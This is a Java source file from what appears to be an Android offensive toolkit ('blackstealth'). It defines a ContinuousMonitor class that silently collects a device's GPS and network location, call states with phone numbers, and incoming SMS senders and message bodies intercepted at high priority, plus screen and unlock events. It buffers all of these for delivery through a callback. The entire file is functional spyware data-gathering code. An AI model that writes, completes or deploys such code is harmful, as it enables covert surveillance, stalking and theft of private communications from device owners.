package com.offensive.blackstealth.gathering;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.util.*;
import java.util.concurrent.*;

/**
 * ContinuousMonitor - Continuously monitors device activity and events
 */
public class ContinuousMonitor {
    private static final String TAG = "ContinuousMonitor";
    
    private Context context;
    private boolean isMonitoring = false;
    private ExecutorService executor;
    private List<MonitorEvent> eventBuffer;
    private MonitorCallback callback;
    
    // Monitors
    private LocationListener locationListener;
    private PhoneStateListener phoneListener;
    private BroadcastReceiver smsReceiver;
    private BroadcastReceiver screenReceiver;
    
    public interface MonitorCallback {
        void onEvent(MonitorEvent event);
    }
    
    public static class MonitorEvent {
        public String type;
        public long timestamp;
        public Map<String, Object> data;
        
        public MonitorEvent(String type) {
            this.type = type;
            this.timestamp = System.currentTimeMillis();
            this.data = new HashMap<>();
        }
    }
    
    public ContinuousMonitor(Context context) {
        this.context = context;
        this.executor = Executors.newFixedThreadPool(3);
        this.eventBuffer = new CopyOnWriteArrayList<>();
    }
    
    public void setCallback(MonitorCallback callback) {
        this.callback = callback;
    }
    
    public void startMonitoring() {
        if (isMonitoring) return;
        isMonitoring = true;
        
        startLocationMonitor();
        startPhoneMonitor();
        startSmsMonitor();
        startScreenMonitor();
        
        Log.i(TAG, "Monitoring started");
    }
    
    public void stopMonitoring() {
        isMonitoring = false;
        
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            if (locationListener != null) lm.removeUpdates(locationListener);
            
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (phoneListener != null) tm.listen(phoneListener, PhoneStateListener.LISTEN_NONE);
            
            if (smsReceiver != null) context.unregisterReceiver(smsReceiver);
            if (screenReceiver != null) context.unregisterReceiver(screenReceiver);
        } catch (Exception e) {}
        
        Log.i(TAG, "Monitoring stopped");
    }
    
    private void startLocationMonitor() {
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            
            locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    MonitorEvent event = new MonitorEvent("location");
                    event.data.put("latitude", location.getLatitude());
                    event.data.put("longitude", location.getLongitude());
                    event.data.put("accuracy", location.getAccuracy());
                    event.data.put("provider", location.getProvider());
                    recordEvent(event);
                }
                
                @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                @Override public void onProviderEnabled(String provider) {}
                @Override public void onProviderDisabled(String provider) {}
            };
            
            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 10, locationListener);
            }
            if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000, 10, locationListener);
            }
        } catch (SecurityException e) {
            Log.w(TAG, "Location permission denied");
        }
    }
    
    private void startPhoneMonitor() {
        try {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            
            phoneListener = new PhoneStateListener() {
                @Override
                public void onCallStateChanged(int state, String phoneNumber) {
                    MonitorEvent event = new MonitorEvent("call");
                    event.data.put("state", state);
                    event.data.put("number", phoneNumber != null ? phoneNumber : "unknown");
                    recordEvent(event);
                }
            };
            
            tm.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
        } catch (Exception e) {}
    }
    
    private void startSmsMonitor() {
        smsReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context ctx, Intent intent) {
                Bundle bundle = intent.getExtras();
                if (bundle != null) {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    if (pdus != null) {
                        for (Object pdu : pdus) {
                            android.telephony.SmsMessage msg = android.telephony.SmsMessage.createFromPdu((byte[]) pdu);
                            MonitorEvent event = new MonitorEvent("sms");
                            event.data.put("sender", msg.getOriginatingAddress());
                            event.data.put("body", msg.getMessageBody());
                            recordEvent(event);
                        }
                    }
                }
            }
        };
        
        try {
            IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
            filter.setPriority(IntentFilter.SYSTEM_HIGH_PRIORITY);
            context.registerReceiver(smsReceiver, filter);
        } catch (Exception e) {}
    }
    
    private void startScreenMonitor() {
        screenReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context ctx, Intent intent) {
                MonitorEvent event = new MonitorEvent("screen");
                event.data.put("action", intent.getAction());
                recordEvent(event);
            }
        };
        
        try {
            IntentFilter filter = new IntentFilter();
            filter.addAction(Intent.ACTION_SCREEN_ON);
            filter.addAction(Intent.ACTION_SCREEN_OFF);
            filter.addAction(Intent.ACTION_USER_PRESENT);
            context.registerReceiver(screenReceiver, filter);
        } catch (Exception e) {}
    }
    
    private void recordEvent(MonitorEvent event) {
        eventBuffer.add(event);
        
        if (callback != null) {
            executor.submit(() -> callback.onEvent(event));
        }
        
        // Limit buffer size
        while (eventBuffer.size() > 1000) {
            eventBuffer.remove(0);
        }
    }
    
    public List<MonitorEvent> getEvents() {
        return new ArrayList<>(eventBuffer);
    }
    
    public void clearEvents() {
        eventBuffer.clear();
    }
    
    public boolean isMonitoring() {
        return isMonitoring;
    }
}
